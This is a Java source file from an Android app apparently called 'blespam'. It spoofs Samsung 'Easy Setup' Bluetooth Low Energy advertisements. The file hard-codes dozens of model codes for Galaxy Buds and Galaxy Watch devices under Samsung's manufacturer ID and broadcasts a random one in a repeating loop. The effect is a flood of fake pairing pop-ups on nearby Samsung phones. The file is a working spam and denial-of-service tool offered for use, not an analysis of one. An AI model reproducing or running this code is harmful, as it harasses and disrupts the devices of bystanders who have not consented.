package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;

import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class EasySetupSpam implements Spammer {
    public Runnable blinkRunnable;
    public EasySetupDevice[] devices;
    public AdvertiseData[] devicesAdvertiseData;
    public AdvertiseData scanResponse;
    private int loop = 0;
    public boolean isSpamming = false;
    ExecutorService executor = Executors.newSingleThreadExecutor();
    public EasySetupSpam(EasySetupDevice.type type) {
        // Init FastPairDevices
        switch (type) {
            default:
            case BUDS:
                devices = new EasySetupDevice[]{
                        // BUDS
                        new EasySetupDevice("0xEE7A0C", "Fallback Buds", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x9D1700", "Fallback Dots", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x39EA48", "Light Purple Buds2", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0xA7C62C", "Bluish Silver Buds2", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x850116", "Black Buds Live", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x3D8F41", "Gray & Black Buds2", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x3B6D02", "Bluish Chrome Buds2", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0xAE063C", "Gray Beige Buds2", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0xB8B905", "Pure White Buds", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0xEAAA17", "Pure White Buds2", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0xD30704", "Black Buds", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x9DB006", "French Flag Buds", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x101F1A", "Dark Purple Buds Live", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x859608", "Dark Blue Buds", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x8E4503", "Pink Buds", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x2C6740", "White & Black Buds2", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x3F6718", "Bronze Buds Live", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x42C519", "Red Buds Live", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0xAE073A", "Black & White Buds2", EasySetupDevice.type.BUDS),
                        new EasySetupDevice("0x011716", "Sleek Black Buds2", EasySetupDevice.type.BUDS),
                };
                break;
            case WATCH:
                devices = new EasySetupDevice[]{
                        // WATCH
                        new EasySetupDevice("0x1A", "Fallback Watch", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x01", "White Watch4 Classic 44m", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x02", "Black Watch4 Classic 40m", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x03", "White Watch4 Classic 40m", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x04", "Black Watch4 44mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x05", "Silver Watch4 44mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x06", "Green Watch4 44mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x07", "Black Watch4 40mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x08", "White Watch4 40mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x09", "Gold Watch4 40mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x0A", "French Watch4", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x0B", "French Watch4 Classic", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x0C", "Fox Watch5 44mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x11", "Black Watch5 44mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x12", "Sapphire Watch5 44mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x13", "Purplish Watch5 40mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x14", "Gold Watch5 40mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x15", "Black Watch5 Pro 45mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x16", "Gray Watch5 Pro 45mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x17", "White Watch5 44mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x18", "White & Black Watch5", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x1B", "Black Watch6 Pink 40mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x1C", "Gold Watch6 Gold 40mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x1D", "Silver Watch6 Cyan 44mm", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x1E", "Black Watch6 Classic 43m", EasySetupDevice.type.WATCH),
                        new EasySetupDevice("0x20", "Green Watch6 Classic 43m", EasySetupDevice.type.WATCH)
                };
                break;
        }
        // Init all possible AdvertiseData
        devicesAdvertiseData = new AdvertiseData[devices.length];
        for(int i = 0; i < devices.length; i++){
            devicesAdvertiseData[i] = new AdvertiseData.Builder()
                    .addManufacturerData(0x0075, Helper.convertHexToByteArray(devices[i].getValue()))
                    .build();
        }
        // Init scanResponse
        scanResponse = new AdvertiseData.Builder()
                .addManufacturerData(0x0075, Helper.convertHexToByteArray("0000000000000000000000000000"))
                .build();
    }

    public void start() {
        executor.execute(() -> {

            isSpamming = true;
            for (loop = 0; loop <= Helper.MAX_LOOP; loop++) {
                if(isSpamming) {
                    // Setup values
                    int r = new Random().nextInt(devices.length);
                    EasySetupDevice device = devices[r];
                    AdvertiseData data = devicesAdvertiseData[r];
                    // Advertise
                    BluetoothAdvertiser b = new BluetoothAdvertiser();
                    if(device.getDeviceType() == EasySetupDevice.type.BUDS){
                        b.advertise(data, scanResponse);
                    }else{
                        b.advertise(data, null);
                    }
                    // Wait before next advertise
                    try {
                        Thread.sleep(Helper.delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    // Stop this advertise to start the next one
                    b.stopAdvertising();
                }
            }
        });
    }

    public boolean isSpamming(){ return isSpamming; }
    public void stop() { loop = Helper.MAX_LOOP+1; isSpamming = false; }
    public Runnable getBlinkRunnable(){ return blinkRunnable; }
    public void setBlinkRunnable(Runnable blinkRunnable){ this.blinkRunnable = blinkRunnable; }
}
